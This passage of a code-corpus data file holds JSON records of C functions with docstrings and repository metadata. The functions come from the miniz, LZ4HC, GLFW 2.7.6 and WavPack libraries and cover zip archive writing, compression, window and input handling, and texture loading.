(MZ_READ_LE32(pBuf) == MZ_ZIP_DATA_DESCRIPTOR_ID);\n\n            if (pZip->m_pState->m_zip64)\n            {\n                /* dest is zip64, so upgrade the data descriptor */\n                const mz_uint32 *pSrc_descriptor = (const mz_uint32 *)((const mz_uint8 *)pBuf + (has_id ? sizeof(mz_uint32) : 0));\n                const mz_uint32 src_crc32 = pSrc_descriptor[0];\n                const mz_uint64 src_comp_size = pSrc_descriptor[1];\n                const mz_uint64 src_uncomp_size = pSrc_descriptor[2];\n\n                mz_write_le32((mz_uint8 *)pBuf, MZ_ZIP_DATA_DESCRIPTOR_ID);\n                mz_write_le32((mz_uint8 *)pBuf + sizeof(mz_uint32) * 1, src_crc32);\n                mz_write_le64((mz_uint8 *)pBuf + sizeof(mz_uint32) * 2, src_comp_size);\n                mz_write_le64((mz_uint8 *)pBuf + sizeof(mz_uint32) * 4, src_uncomp_size);\n\n                n = sizeof(mz_uint32) * 6;\n            }\n            else\n            {\n                /* dest is NOT zip64, just copy it as-is */\n                n = sizeof(mz_uint32) * (has_id ? 4 : 3);\n            }\n        }\n\n        if (pZip->m_pWrite(pZip->m_pIO_opaque, cur_dst_file_ofs, pBuf, n) != n)\n        {\n            pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n            return mz_zip_set_error(pZip, MZ_ZIP_FILE_WRITE_FAILED);\n        }\n\n        cur_src_file_ofs += n;\n        cur_dst_file_ofs += n;\n    }\n    pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n\n    /* Finally, add the new central dir header */\n    orig_central_dir_size = pState->m_central_dir.m_size;\n\n    memcpy(new_central_header, pSrc_central_header, MZ_ZIP_CENTRAL_DIR_HEADER_SIZE);\n\n    if (pState->m_zip64)\n    {\n        /* This is the painful part: We need to write a new central dir header + ext block with updated zip64 fields, and ensure the old fields (if any) are not included. */\n        const mz_uint8 *pSrc_ext = pSrc_central_header + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE + src_filename_len;\n        mz_zip_array new_ext_block;\n\n        mz_zip_array_init(&new_ext_block, sizeof(mz_uint8));\n\n        MZ_WRITE_LE32(new_central_header + MZ_ZIP_CDH_COMPRESSED_SIZE_OFS, MZ_UINT32_MAX);\n        MZ_WRITE_LE32(new_central_header + MZ_ZIP_CDH_DECOMPRESSED_SIZE_OFS, MZ_UINT32_MAX);\n        MZ_WRITE_LE32(new_central_header + MZ_ZIP_CDH_LOCAL_HEADER_OFS, MZ_UINT32_MAX);\n\n        if (!mz_zip_writer_update_zip64_extension_block(&new_ext_block, pZip, pSrc_ext, src_ext_len, &src_file_stat.m_comp_size, &src_file_stat.m_uncomp_size, &local_dir_header_ofs, NULL))\n        {\n            mz_zip_array_clear(pZip, &new_ext_block);\n            return MZ_FALSE;\n        }\n\n        MZ_WRITE_LE16(new_central_header + MZ_ZIP_CDH_EXTRA_LEN_OFS, new_ext_block.m_size);\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, new_central_header, MZ_ZIP_CENTRAL_DIR_HEADER_SIZE))\n        {\n            mz_zip_array_clear(pZip, &new_ext_block);\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, pSrc_central_header + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE, src_filename_len))\n        {\n            mz_zip_array_clear(pZip, &new_ext_block);\n            mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, new_ext_block.m_p, new_ext_block.m_size))\n        {\n            mz_zip_array_clear(pZip, &new_ext_block);\n            mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, pSrc_central_header + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE + src_filename_len + src_ext_len, src_comment_len))\n        {\n            mz_zip_array_clear(pZip, &new_ext_block);\n            mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n\n        mz_zip_array_clear(pZip, &new_ext_block);\n    }\n    else\n    {\n        /* sanity checks */\n        if (cur_dst_file_ofs > MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_ARCHIVE_TOO_LARGE);\n\n        if (local_dir_header_ofs >= MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_ARCHIVE_TOO_LARGE);\n\n        MZ_WRITE_LE32(new_central_header + MZ_ZIP_CDH_LOCAL_HEADER_OFS, local_dir_header_ofs);\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, new_central_header, MZ_ZIP_CENTRAL_DIR_HEADER_SIZE))\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n\n        if (!mz_zip_array_push_back(pZip, &pState->m_central_dir, pSrc_central_header + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE, src_central_dir_following_data_size))\n        {\n            mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n    }\n\n    /* This shouldn't trigger unless we screwed up during the initial sanity checks */\n    if (pState->m_central_dir.m_size >= MZ_UINT32_MAX)\n    {\n        /* TODO: Support central dirs >= 32-bits in size */\n        mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n        return mz_zip_set_error(pZip, MZ_ZIP_UNSUPPORTED_CDIR_SIZE);\n    }\n\n    n = (mz_uint32)orig_central_dir_size;\n    if (!mz_zip_array_push_back(pZip, &pState->m_central_dir_offsets, &n, 1))\n    {\n        mz_zip_array_resize(pZip, &pState->m_central_dir, orig_central_dir_size, MZ_FALSE);\n        return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n    }\n\n    pZip->m_total_files++;\n    pZip->m_archive_size = cur_dst_file_ofs;\n\n    return MZ_TRUE;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* LZ4HC_countPattern() :\n * pattern32 must be a sample of repetitive pattern of length 1, 2 or 4 (but not 3!) */\n", "func_signal": "static unsigned\nLZ4HC_countPattern(const BYTE* ip, const BYTE* const iEnd, U32 const pattern32)", "code": "{\n    const BYTE* const iStart = ip;\n    reg_t const pattern = (sizeof(pattern)==8) ? (reg_t)pattern32 + (((reg_t)pattern32) << 32) : pattern32;\n\n    while (likely(ip < iEnd-(sizeof(pattern)-1))) {\n        reg_t const diff = LZ4_read_ARCH(ip) ^ pattern;\n        if (!diff) { ip+=sizeof(pattern); continue; }\n        ip += LZ4_NbCommonBytes(diff);\n        return (unsigned)(ip - iStart);\n    }\n\n    if (LZ4_isLittleEndian()) {\n        reg_t patternByte = pattern;\n        while ((ip<iEnd) && (*ip == (BYTE)patternByte)) {\n            ip++; patternByte >>= 8;\n        }\n    } else {  /* big endian */\n        U32 bitOffset = (sizeof(pattern)*8) - 8;\n        while (ip < iEnd) {\n            BYTE const byte = (BYTE)(pattern >> bitOffset);\n            if (*ip != byte) break;\n            ip ++; bitOffset -= 8;\n        }\n    }\n\n    return (unsigned)(ip - iStart);\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "//========================================================================\n// Get window parameter\n//========================================================================\n", "func_signal": "GLFWAPI int GLFWAPIENTRY glfwGetWindowParam( int param )", "code": "{\n    if( !_glfwInitialized )\n    {\n        return 0;\n    }\n\n    // Is the window opened?\n    if( !_glfwWin.opened )\n    {\n        if( param == GLFW_OPENED )\n        {\n            return GL_FALSE;\n        }\n        return 0;\n    }\n\n    // Window parameters\n    switch( param )\n    {\n        case GLFW_OPENED:\n            return GL_TRUE;\n        case GLFW_ACTIVE:\n            return _glfwWin.active;\n        case GLFW_ICONIFIED:\n            return _glfwWin.iconified;\n        case GLFW_ACCELERATED:\n            return _glfwWin.accelerated;\n        case GLFW_RED_BITS:\n            return _glfwWin.redBits;\n        case GLFW_GREEN_BITS:\n            return _glfwWin.greenBits;\n        case GLFW_BLUE_BITS:\n            return _glfwWin.blueBits;\n        case GLFW_ALPHA_BITS:\n            return _glfwWin.alphaBits;\n        case GLFW_DEPTH_BITS:\n            return _glfwWin.depthBits;\n        case GLFW_STENCIL_BITS:\n            return _glfwWin.stencilBits;\n        case GLFW_ACCUM_RED_BITS:\n            return _glfwWin.accumRedBits;\n        case GLFW_ACCUM_GREEN_BITS:\n            return _glfwWin.accumGreenBits;\n        case GLFW_ACCUM_BLUE_BITS:\n            return _glfwWin.accumBlueBits;\n        case GLFW_ACCUM_ALPHA_BITS:\n            return _glfwWin.accumAlphaBits;\n        case GLFW_AUX_BUFFERS:\n            return _glfwWin.auxBuffers;\n        case GLFW_STEREO:\n            return _glfwWin.stereo;\n        case GLFW_REFRESH_RATE:\n            return _glfwWin.refreshRate;\n        case GLFW_WINDOW_NO_RESIZE:\n            return _glfwWin.windowNoResize;\n        case GLFW_FSAA_SAMPLES:\n            return _glfwWin.samples;\n        case GLFW_OPENGL_VERSION_MAJOR:\n            return _glfwWin.glMajor;\n        case GLFW_OPENGL_VERSION_MINOR:\n            return _glfwWin.glMinor;\n        case GLFW_OPENGL_FORWARD_COMPAT:\n            return _glfwWin.glForward;\n        case GLFW_OPENGL_DEBUG_CONTEXT:\n            return _glfwWin.glDebug;\n        case GLFW_OPENGL_PROFILE:\n            return _glfwWin.glProfile;\n        default:\n            return 0;\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Register keyboard activity\n//========================================================================\n", "func_signal": "void _glfwInputKey( int key, int action )", "code": "{\n    int keyrepeat = 0;\n\n    if( key < 0 || key > GLFW_KEY_LAST )\n    {\n        return;\n    }\n\n    // Are we trying to release an already released key?\n    if( action == GLFW_RELEASE && _glfwInput.Key[ key ] != GLFW_PRESS )\n    {\n        return;\n    }\n\n    // Register key action\n    if( action == GLFW_RELEASE && _glfwInput.StickyKeys )\n    {\n        _glfwInput.Key[ key ] = GLFW_STICK;\n    }\n    else\n    {\n        keyrepeat = (_glfwInput.Key[ key ] == GLFW_PRESS) &&\n                    (action == GLFW_PRESS);\n        _glfwInput.Key[ key ] = (char) action;\n    }\n\n    // Call user callback function\n    if( _glfwWin.keyCallback && (_glfwInput.KeyRepeat || !keyrepeat) )\n    {\n        _glfwWin.keyCallback( key, action );\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Register mouse button clicks\n//========================================================================\n", "func_signal": "void _glfwInputMouseClick( int button, int action )", "code": "{\n    if( button >= 0 && button <= GLFW_MOUSE_BUTTON_LAST )\n    {\n        // Register mouse button action\n        if( action == GLFW_RELEASE && _glfwInput.StickyMouseButtons )\n        {\n            _glfwInput.MouseButton[ button ] = GLFW_STICK;\n        }\n        else\n        {\n            _glfwInput.MouseButton[ button ] = (char) action;\n        }\n\n        // Call user callback function\n        if( _glfwWin.mouseButtonCallback )\n        {\n            _glfwWin.mouseButtonCallback( button, action );\n        }\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Swap buffers (double-buffering) and poll any new events\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSwapBuffers( void )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    _glfwPlatformSwapBuffers();\n\n    // Check for window messages\n    if( _glfwWin.autoPollEvents )\n    {\n        glfwPollEvents();\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Window iconification\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwIconifyWindow( void )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened || _glfwWin.iconified )\n    {\n        return;\n    }\n\n    // Iconify window\n    _glfwPlatformIconifyWindow();\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Set the window title\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetWindowTitle( const char *title )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set window title\n    _glfwPlatformSetWindowTitle( title );\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Upload an image object to texture memory\n//========================================================================\n", "func_signal": "GLFWAPI int  GLFWAPIENTRY glfwLoadTextureImage2D( GLFWimage *img, int flags )", "code": "{\n    GLint   UnpackAlignment, GenMipMap;\n    int     level, format, AutoGen, newsize, n;\n    unsigned char *data, *dataptr;\n\n    // Is GLFW initialized?\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return GL_FALSE;\n    }\n\n    // TODO: Use GL_MAX_TEXTURE_SIZE or GL_PROXY_TEXTURE_2D to determine\n    //       whether the image size is valid.\n    // NOTE: May require box filter downsampling routine.\n\n    // Do we need to convert the alpha map to RGBA format (OpenGL 1.0)?\n    if( (_glfwWin.glMajor == 1) && (_glfwWin.glMinor == 0) &&\n        (img->Format == GL_ALPHA) )\n    {\n        // We go to RGBA representation instead\n        img->BytesPerPixel = 4;\n\n        // Allocate memory for new RGBA image data\n        newsize = img->Width * img->Height * img->BytesPerPixel;\n        data = (unsigned char *) malloc( newsize );\n        if( data == NULL )\n        {\n            free( img->Data );\n            return GL_FALSE;\n        }\n\n        // Convert Alpha map to RGBA\n        dataptr = data;\n        for( n = 0; n < (img->Width*img->Height); ++ n )\n        {\n            *dataptr ++ = 255;\n            *dataptr ++ = 255;\n            *dataptr ++ = 255;\n            *dataptr ++ = img->Data[n];\n        }\n\n        // Free memory for old image data (not needed anymore)\n        free( img->Data );\n\n        // Set pointer to new image data\n        img->Data = data;\n    }\n\n    // Set unpack alignment to one byte\n    glGetIntegerv( GL_UNPACK_ALIGNMENT, &UnpackAlignment );\n    glPixelStorei( GL_UNPACK_ALIGNMENT, 1 );\n\n    // Should we use automatic mipmap generation?\n    AutoGen = ( flags & GLFW_BUILD_MIPMAPS_BIT ) &&\n              _glfwWin.has_GL_SGIS_generate_mipmap;\n\n    // Enable automatic mipmap generation\n    if( AutoGen )\n    {\n        glGetTexParameteriv( GL_TEXTURE_2D, GL_GENERATE_MIPMAP_SGIS,\n            &GenMipMap );\n        glTexParameteri( GL_TEXTURE_2D, GL_GENERATE_MIPMAP_SGIS,\n            GL_TRUE );\n    }\n\n    // Format specification is different for OpenGL 1.0\n    if( _glfwWin.glMajor == 1 && _glfwWin.glMinor == 0 )\n    {\n        format = img->BytesPerPixel;\n    }\n    else\n    {\n        format = img->Format;\n    }\n\n    // Upload to texture memeory\n    level = 0;\n    do\n    {\n        // Upload this mipmap level\n        glTexImage2D( GL_TEXTURE_2D, level, format,\n            img->Width, img->Height, 0, format,\n            GL_UNSIGNED_BYTE, (void*) img->Data );\n\n        // Build next mipmap level manually, if required\n        if( ( flags & GLFW_BUILD_MIPMAPS_BIT ) && !AutoGen )\n        {\n            level = HalveImage( img->Data, &img->Width,\n                        &img->Height, img->BytesPerPixel ) ?\n                    level + 1 : 0;\n        }\n    }\n    while( level != 0 );\n\n    // Restore old automatic mipmap generation state\n    if( AutoGen )\n    {\n        glTexParameteri( GL_TEXTURE_2D, GL_GENERATE_MIPMAP_SGIS,\n            GenMipMap );\n    }\n\n    // Restore old unpack alignment\n    glPixelStorei( GL_UNPACK_ALIGNMENT, UnpackAlignment );\n\n    return GL_TRUE;\n}", "path": "extern\\glfw-2.7.6\\lib\\image.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Wait for new window and input events\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwWaitEvents( void )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Poll for new events\n    _glfwPlatformWaitEvents();\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Handle the input tracking part of window deactivation\n//========================================================================\n", "func_signal": "void _glfwInputDeactivation( void )", "code": "{\n    int i;\n\n    // Release all keyboard keys\n    for( i = 0; i <= GLFW_KEY_LAST; i ++ )\n    {\n        if( _glfwInput.Key[ i ] == GLFW_PRESS )\n        {\n            _glfwInputKey( i, GLFW_RELEASE );\n        }\n    }\n\n    // Release all mouse buttons\n    for( i = 0; i <= GLFW_MOUSE_BUTTON_LAST; i ++ )\n    {\n        if( _glfwInput.MouseButton[ i ] == GLFW_PRESS )\n        {\n            _glfwInputMouseClick( i, GLFW_RELEASE );\n        }\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Poll for new window and input events\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwPollEvents( void )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Poll for new events\n    _glfwPlatformPollEvents();\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Set the window size\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetWindowSize( int width, int height )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened || _glfwWin.iconified )\n    {\n        return;\n    }\n\n    // Don't do anything if the window size did not change\n    if( width == _glfwWin.width && height == _glfwWin.height )\n    {\n        return;\n    }\n\n    // Change window size\n    _glfwPlatformSetWindowSize( width, height );\n\n    // Refresh window parameters (may have changed due to changed video\n    // modes)\n    _glfwPlatformRefreshWindowParams();\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Free allocated memory for an image\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwFreeImage( GLFWimage *img )", "code": "{\n    // Is GLFW initialized?\n    if( !_glfwInitialized )\n    {\n        return;\n    }\n\n    // Free memory\n    if( img->Data != NULL )\n    {\n        free( img->Data );\n        img->Data = NULL;\n    }\n\n    // Clear all fields\n    img->Width         = 0;\n    img->Height        = 0;\n    img->Format        = 0;\n    img->BytesPerPixel = 0;\n}", "path": "extern\\glfw-2.7.6\\lib\\image.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Set callback function for window close events\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetWindowCloseCallback( GLFWwindowclosefun cbfun )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    // Set callback function\n    _glfwWin.windowCloseCallback = cbfun;\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Rescales an image into power-of-two dimensions\n//========================================================================\n", "func_signal": "static int RescaleImage( GLFWimage* image )", "code": "{\n    int     width, height, log2, newsize;\n    unsigned char *data;\n\n    // Calculate next larger 2^N width\n    for( log2 = 0, width = image->Width; width > 1; width >>= 1, log2 ++ )\n      ;\n\n    width  = (int) 1 << log2;\n    if( width < image->Width )\n    {\n        width <<= 1;\n    }\n\n    // Calculate next larger 2^M height\n    for( log2 = 0, height = image->Height; height > 1; height >>= 1, log2 ++ )\n      ;\n\n    height = (int) 1 << log2;\n    if( height < image->Height )\n    {\n        height <<= 1;\n    }\n\n    // Do we really need to rescale?\n    if( width != image->Width || height != image->Height )\n    {\n        // Allocate memory for new (upsampled) image data\n        newsize = width * height * image->BytesPerPixel;\n        data = (unsigned char *) malloc( newsize );\n        if( data == NULL )\n        {\n            free( image->Data );\n            return GL_FALSE;\n        }\n\n        // Copy old image data to new image data with interpolation\n        UpsampleImage( image->Data, data, image->Width, image->Height,\n                       width, height, image->BytesPerPixel );\n\n        // Free memory for old image data (not needed anymore)\n        free( image->Data );\n\n        // Set pointer to new image data, and set new image dimensions\n        image->Data   = data;\n        image->Width  = width;\n        image->Height = height;\n    }\n\n    return GL_TRUE;\n}", "path": "extern\\glfw-2.7.6\\lib\\image.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Clear all open window hints\n//========================================================================\n", "func_signal": "void _glfwClearWindowHints( void )", "code": "{\n    memset( &_glfwLibrary.hints, 0, sizeof( _glfwLibrary.hints ) );\n    _glfwLibrary.hints.glMajor = 1;\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Return the available framebuffer config closest to the desired values\n// This is based on the manual GLX Visual selection from 2.6\n//========================================================================\n", "func_signal": "const _GLFWfbconfig *_glfwChooseFBConfig( const _GLFWfbconfig *desired,\n                                          const _GLFWfbconfig *alternatives,\n                                          unsigned int count )", "code": "{\n    unsigned int i;\n    unsigned int missing, leastMissing = UINT_MAX;\n    unsigned int colorDiff, leastColorDiff = UINT_MAX;\n    unsigned int extraDiff, leastExtraDiff = UINT_MAX;\n    const _GLFWfbconfig *current;\n    const _GLFWfbconfig *closest = NULL;\n\n    for( i = 0;  i < count;  i++ )\n    {\n        current = alternatives + i;\n\n        if( desired->stereo > 0 && current->stereo == 0 )\n        {\n            // Stereo is a hard constraint\n            continue;\n        }\n\n        // Count number of missing buffers\n        {\n            missing = 0;\n\n            if( desired->alphaBits > 0 && current->alphaBits == 0 )\n            {\n                missing++;\n            }\n\n            if( desired->depthBits > 0 && current->depthBits == 0 )\n            {\n                missing++;\n            }\n\n            if( desired->stencilBits > 0 && current->stencilBits == 0 )\n            {\n                missing++;\n            }\n\n            if( desired->auxBuffers > 0 && current->auxBuffers < desired->auxBuffers )\n            {\n                missing += desired->auxBuffers - current->auxBuffers;\n            }\n\n            if( desired->samples > 0 && current->samples == 0 )\n            {\n                // Technically, several multisampling buffers could be\n                // involved, but that's a lower level implementation detail and\n                // not important to us here, so we count them as one\n                missing++;\n            }\n        }\n\n        // These polynomials make many small channel size differences matter\n        // less than one large channel size difference\n\n        // Calculate color channel size difference value\n        {\n            colorDiff = 0;\n\n            if ( desired->redBits > 0 )\n            {\n                colorDiff += ( desired->redBits - current->redBits ) *\n                             ( desired->redBits - current->redBits );\n            }\n\n            if ( desired->greenBits > 0 )\n            {\n                colorDiff += ( desired->greenBits - current->greenBits ) *\n                             ( desired->greenBits - current->greenBits );\n            }\n\n            if ( desired->blueBits > 0 )\n            {\n                colorDiff += ( desired->blueBits - current->blueBits ) *\n                             ( desired->blueBits - current->blueBits );\n            }\n        }\n\n        // Calculate non-color channel size difference value\n        {\n            extraDiff = 0;\n\n            if( desired->alphaBits > 0 )\n            {\n                extraDiff += ( desired->alphaBits - current->alphaBits ) *\n                             ( desired->alphaBits - current->alphaBits );\n            }\n\n            if( desired->depthBits > 0 )\n            {\n                extraDiff += ( desired->depthBits - current->depthBits ) *\n                             ( desired->depthBits - current->depthBits );\n            }\n\n            if( desired->stencilBits > 0 )\n            {\n                extraDiff += ( desired->stencilBits - current->stencilBits ) *\n                             ( desired->stencilBits - current->stencilBits );\n            }\n\n            if( desired->accumRedBits > 0 )\n            {\n                extraDiff += ( desired->accumRedBits - current->accumRedBits ) *\n                             ( desired->accumRedBits - current->accumRedBits );\n            }\n\n            if( desired->accumGreenBits > 0 )\n            {\n                extraDiff += ( desired->accumGreenBits - current->accumGreenBits ) *\n                             ( desired->accumGreenBits - current->accumGreenBits );\n            }\n\n            if( desired->accumBlueBits > 0 )\n            {\n                extraDiff += ( desired->accumBlueBits - current->accumBlueBits ) *\n                             ( desired->accumBlueBits - current->accumBlueBits );\n            }\n\n            if( desired->accumAlphaBits > 0 )\n            {\n                extraDiff += ( desired->accumAlphaBits - current->accumAlphaBits ) *\n                             ( desired->accumAlphaBits - current->accumAlphaBits );\n            }\n\n            if( desired->samples > 0 )\n            {\n                extraDiff += ( desired->samples - current->samples ) *\n                             ( desired->samples - current->samples );\n            }\n        }\n\n        // Figure out if the current one is better than the best one found so far\n\n        if( missing < leastMissing )\n        {\n            closest = current;\n        }\n        else if( missing == leastMissing )\n        {\n            if( ( colorDiff < leastColorDiff ) ||\n                ( colorDiff == leastColorDiff && extraDiff < leastExtraDiff ) )\n            {\n                closest = current;\n            }\n        }\n\n        if( current == closest )\n        {\n            leastMissing = missing;\n            leastColorDiff = colorDiff;\n            leastExtraDiff = extraDiff;\n        }\n    }\n\n    return closest;\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Read an image from a file, and upload it to texture memory\n//========================================================================\n", "func_signal": "GLFWAPI int GLFWAPIENTRY glfwLoadTexture2D( const char *name, int flags )", "code": "{\n    GLFWimage img;\n\n    // Is GLFW initialized?\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return GL_FALSE;\n    }\n\n    // Force rescaling if necessary\n    if( !_glfwWin.has_GL_ARB_texture_non_power_of_two )\n    {\n        flags &= (~GLFW_NO_RESCALE_BIT);\n    }\n\n    // Read image from file\n    if( !glfwReadImage( name, &img, flags ) )\n    {\n        return GL_FALSE;\n    }\n\n    if( !glfwLoadTextureImage2D( &img, flags ) )\n    {\n        return GL_FALSE;\n    }\n\n    // Data buffer is not needed anymore\n    glfwFreeImage( &img );\n\n    return GL_TRUE;\n}", "path": "extern\\glfw-2.7.6\\lib\\image.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Get the window size\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwGetWindowSize( int *width, int *height )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened )\n    {\n        return;\n    }\n\n    if( width != NULL )\n    {\n        *width = _glfwWin.width;\n    }\n    if( height != NULL )\n    {\n        *height = _glfwWin.height;\n    }\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Check if an OpenGL extension is available at runtime\n//========================================================================\n", "func_signal": "int _glfwPlatformExtensionSupported( const char *extension )", "code": "{\n    const GLubyte *extensions;\n\n    // Get list of GLX extensions\n    extensions = (const GLubyte*) glXQueryExtensionsString( _glfwLibrary.display,\n                                                            _glfwWin.screen );\n    if( extensions != NULL )\n    {\n        if( _glfwStringInExtensionString( extension, extensions ) )\n        {\n            return GL_TRUE;\n        }\n    }\n\n    return GL_FALSE;\n}", "path": "extern\\glfw-2.7.6\\lib\\x11\\x11_glext.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "//========================================================================\n// Set the window position\n//========================================================================\n", "func_signal": "GLFWAPI void GLFWAPIENTRY glfwSetWindowPos( int x, int y )", "code": "{\n    if( !_glfwInitialized || !_glfwWin.opened || _glfwWin.fullscreen ||\n        _glfwWin.iconified )\n    {\n        return;\n    }\n\n    // Set window position\n    _glfwPlatformSetWindowPos( x, y );\n}", "path": "extern\\glfw-2.7.6\\lib\\window.c", "repo_name": "openglsuperbible/sb6code", "stars": 478, "license": "None", "language": "c", "size": 1685}
{"docstring": "// This function initialzes the main bitstream for audio samples, which must\n// be in the \"wv\" file.\n", "func_signal": "int init_wv_bitstream (WavpackContext *wpc, WavpackMetadata *wpmd)", "code": "{\n    WavpackStream *wps = &wpc->stream;\n\n    if (wpmd->data)\n        bs_open_read (&wps->wvbits, wpmd->data, (unsigned char *) wpmd->data + wpmd->byte_length, NULL, 0);\n    else if (wpmd->byte_length)\n        bs_open_read (&wps->wvbits, wpc->read_buffer, wpc->read_buffer + sizeof (wpc->read_buffer),\n            wpc->infile, wpmd->byte_length + (wpmd->byte_length & 1));\n\n    return TRUE;\n}", "path": "src\\engine\\external\\wavpack\\unpack.c", "repo_name": "matricks/teeworlds", "stars": 272, "license": "other", "language": "c", "size": 69104}
